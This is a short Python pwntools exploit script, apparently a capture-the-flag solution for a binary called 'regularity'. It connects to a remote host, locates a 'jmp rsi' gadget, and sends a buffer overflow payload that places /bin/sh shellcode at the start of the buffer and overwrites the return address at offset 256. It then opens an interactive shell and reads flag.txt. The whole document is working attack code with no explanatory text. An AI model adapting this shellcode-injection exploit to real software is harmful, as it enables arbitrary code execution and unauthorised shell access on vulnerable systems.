#!/usr/bin/env python3

from pwn import *

io = connect("94.237.62.181", 30144)

elf = context.binary = ELF('./regularity', checksec=False)

JMP_RSI = next(elf.search(asm('jmp rsi')))

payload = flat({
    0:      asm(shellcraft.sh()),  # Inject shellcode to execute /bin/sh
    256:    JMP_RSI                # Overwrite the return address with 'jmp rsi'
 })


io.sendlineafter(b'days?\n', payload)
io.interactive()
io.sendline(b'cat flag.txt')
print(io.recvline())
io.interactive()
